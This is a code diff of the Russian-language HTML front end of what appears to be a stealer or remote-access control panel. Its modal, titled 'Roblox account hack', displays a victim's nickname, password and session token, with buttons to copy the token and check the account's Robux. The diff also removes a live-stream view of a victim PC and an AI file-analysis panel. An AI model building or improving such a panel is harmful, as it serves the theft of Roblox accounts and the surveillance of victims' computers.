@@ -32,7 +32,10 @@
 
   <!-- Grid -->
   <main class="files-grid" id="fileGrid">
-    <div class="empty"><span class="empty-icon">🌌</span>Список файлов пуст</div>
+    <div class="skeleton" style="height: 250px;"></div>
+    <div class="skeleton" style="height: 250px;"></div>
+    <div class="skeleton" style="height: 250px;"></div>
+    <div class="skeleton" style="height: 250px;"></div>
   </main>
 
   <!-- Details Modal -->
@@ -61,48 +64,27 @@
           <div class="specs-section" id="robloxSpecsSection">
             <h4 class="section-title">Взлом аккаунта Roblox</h4>
             <div class="specs-grid">
-              <div class="spec-row"><span class="spec-lbl">👤 Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: #00e676; font-weight: 700;">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">🔑 Пароль</span><span class="spec-val" id="robloxSpecPass" style="color: #ff1744; font-weight: 700; letter-spacing: 0.5px;">—</span></div>
+              <div class="spec-row"><span class="spec-lbl">👤 Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 700;">—</span></div>
+              <div class="spec-row"><span class="spec-lbl">🔑 Пароль</span><span class="spec-val" id="robloxSpecPass" style="color: var(--danger); font-weight: 700; letter-spacing: 0.5px;">—</span></div>
               <div class="spec-row" id="robloxSpecTokenRow">
                 <span class="spec-lbl">🎫 Токен</span>
-                <div style="display:flex; flex-direction:column; align-items:flex-end; gap:4px; max-width:70%;">
+                <div style="display:flex; flex-direction:column; align-items:flex-end; gap:6px; max-width:70%;">
                   <div class="token-display" id="robloxSpecToken">—</div>
-                  <button class="copy-btn" id="robloxCopyBtn" style="padding:2px 10px; border-radius:4px; border:none; font-size:0.7rem; font-weight:600; font-family:inherit;" onclick="copyToken()">📋 Копировать</button>
+                  <button class="copy-btn" id="robloxCopyBtn" style="padding:4px 12px; font-size:0.7rem; font-weight:600;" onclick="copyToken()">📋 Копировать</button>
                 </div>
               </div>
-              <div class="spec-row" id="robloxSpecRobuxRow" style="display:none;"><span class="spec-lbl">💰 Robux</span><span class="spec-val" id="robloxSpecRobux" style="color: #2ed573; font-weight: 700; font-size: 1.1rem;">—</span></div>
+              <div class="spec-row" id="robloxSpecRobuxRow" style="display:none;"><span class="spec-lbl">💰 Robux</span><span class="spec-val" id="robloxSpecRobux" style="color: var(--success); font-weight: 800; font-size: 1.15rem;">—</span></div>
               <div class="spec-row" id="robloxSpecStatusRow" style="display:none;"><span class="spec-lbl">✅ Статус</span><span class="spec-val" id="robloxSpecStatus" style="font-weight: 600;">—</span></div>
             </div>
           </div>
 
           <div class="modal-actions">
-            <button class="modal-btn stream-btn" id="modalStreamBtn">📺 Смотреть стрим</button>
             <button class="modal-btn robux-btn" id="modalRobuxBtn">💰 Проверить Robux</button>
-            <button class="modal-btn ai-btn" id="modalAiBtn">🤖 AI Анализ файла</button>
             <button class="modal-btn del-btn" id="modalDeleteBtn">🗑 Удалить файл</button>
           </div>
         </div>
       </div>
     </div>
-  </div>
-
-  <!-- Stream Modal -->
-  <div id="streamModal" class="modal-overlay" onclick="closeStreamModal()">
-    <div class="stream-container" onclick="event.stopPropagation()">
-      <button class="modal-close" onclick="closeStreamModal()" style="top:0.5rem;right:0.5rem;">✕</button>
-      <div class="stream-header">📺 LIVE STREAM — <span id="streamPcName">—</span></div>
-      <img id="streamImg" class="stream-img" src="" alt="Live stream">
-      <div class="stream-status" id="streamStatus">⏳ Подключение к стриму...</div>
-    </div>
-  </div>
-
-  <!-- AI Side Panel -->
-  <div id="aiPanel">
-    <div class="ai-hd">
-      <div class="ai-hd-left"><span class="ai-dot"></span> AI Анализатор</div>
-      <button class="btn-close-ai" onclick="document.getElementById('aiPanel').style.display='none'">✕</button>
-    </div>
-    <div class="ai-body" id="aiBody">Анализ...</div>
   </div>
 
   <div id="toast"></div>
